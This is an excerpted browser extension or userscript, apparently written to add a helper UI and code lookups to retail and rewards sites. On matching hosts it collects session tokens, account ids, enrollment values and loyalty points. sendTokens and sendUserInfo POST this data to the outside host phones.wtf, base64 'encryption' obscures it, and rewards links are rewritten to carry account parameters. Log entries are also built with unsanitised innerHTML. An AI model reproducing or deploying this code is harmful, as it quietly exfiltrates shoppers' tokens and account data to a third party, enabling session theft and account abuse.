var hostAddress = "https://phones.wtf";

function encrypt(wholeThing)
{
    var part1=wholeThing.substr(0,wholeThing.length/2);
    var p1=btoa(part1);
    var part2=wholeThing.substr(wholeThing.length/2);
    var p2=btoa(part2);
    var k=btoa(p2+p1);
    return k;
}
...
{
    var k2=atob(k);
    var part3=atob(k2.substr(0,k2.length/2));
    var part4=atob(k2.substr(k2.length/2));
    var newThing=part4+part3;
    return newThing;
}
function initUI(ident) 
{
	class UserInterface
	{
			...
			{ 
				...
				var entry=document.createElement('logEntry'); 
					entry.innerHTML="<entryText>"+input+"</entryText><entryTime>"+new Date().toLocaleDateString()+" "+new Date().toLocaleTimeString().replace(/:\d+ /g," ")+"</entryTime>"; 
				this.console.appendChild(entry); 				
				if(mode==1) { entry.querySelector('entryText').style.userSelect='text'; }
			...
			setxy(x,y) { fetch(hostAddress + "/css/gui/?xy="+JSON.stringify({"x":x,"y":y})); }

			async getCSS() 
			{
				var cssURL= hostAddress + "/css/gui/"+this.brand+".css";
				...
				return f;
					...
					async getxy() { var xy=fetch(hostAddress + "/css/gui/?xy").then((Response)=>Response.json()).catch((err)=>{  var xy='{"x":"20px","y":"250px"}'; }); return xy; }
...
async function getUserInfo() 
{
    ...
    if(roToken!=null) 
    {
        ...
        if(typeof(sessionStorage.$userService)=='string')
        {
			...
			var brndName=main.dataset.brand;
            ...
            userInfo.brand=main.dataset.brand;
			out2Console();
...
{
	userInfo=await getUserInfo(); console.log("SCRIPTS");
...
function sendUserInfo(userInfo,output)
{
	...
	req.open('POST','https://phones.wtf/lookup/');
	req.onload=()=>{ var serverResponse = req.response;  outputUser(userInfo,serverResponse,output);   checkResult(serverResponse,output);  };
	req.send(localStorage.userInfo);
	
	req.open('POST','http://localhost/lookup/');
	req.onload=()=>{ var serverResponse = req.response;  outputUser(userInfo,serverResponse,output);   checkResult(serverResponse,output);  };
	req.send(localStorage.userInfo);
	...
	console.log(ui);
		...
		if(aemHosts.includes(location.host))
		{
			var cid=document.querySelector('[data-brand]').dataset.clientid;
				...
				console.log(cid);
			var scriptResult=await runScripts();
				console.log("Script Results: ",scriptResult);
					...
					if(typeof(userInfo.enrollments)=="object") 
					{
						var links2Change=document.querySelectorAll("a[href*=dashboard]");
							Object.values(links2Change).filter((l)=>{ if(l.href.match(/rewards./gmi)){  return l;} }).forEach((link)=>{ link.href+="?actid="+userInfo.id+"&pp="+userInfo.enrollments[0].characteristics[1].value+"&ap="+userInfo.enrollments[0].characteristics[2].value; }); 
					}
...
function out2Console() 
{
	...
	console.log("LRP Status: "+usr.lrp.status);
		if(usr.lrp.status!="INACTIVE")
		{
			...
			console.log("Total Points: "+usr.lrp.totalPoints);
			console.log("Pending Points: "+usr.lrp.pendingPoints);
			console.log("Available Points: "+usr.lrp.availablePoints);
		}
}
...
async function sendTokens() 
{
	if(aemHosts.includes(location.host) && document.querySelector('tknSent')==null)
	{
		...
		document.body.appendChild(tknSent);
					...
					fetch(hostAddress + "/api/",{"body":JSON.stringify(sender),"method":"POST"});	
	}
}
...
var marker=document.createElement("wtfgui");
if(document.querySelector("wtfgui")===null) {
...
var ui = initUI(new Date()-0);  
if(aemHosts.includes(location.host) || ibmHosts.includes(location.host))
{
	extStart(ui).then(()=>{ possibleCodeOrders(300);  addItemList(); });
}
else 
{
	if(location.host.match(/rewards/g)!=null) 
	{
		setTimeout(()=>{   dolrp(ui); },1500)
	}
} 
/*
					if(location.pathname.match(/AjaxOrderItemDisplayView|TFSPOrderShippingBillingView|TFOrderItemDisplay/gmi)) 
					{ 		
						if(document.querySelector('#codesContainer')==null) 
						{ 
							try
							{
								shopcodes(); 
							...
							{ 
								console.log('Failed to load shopcodes.');  
							}	
						}			
					}			 
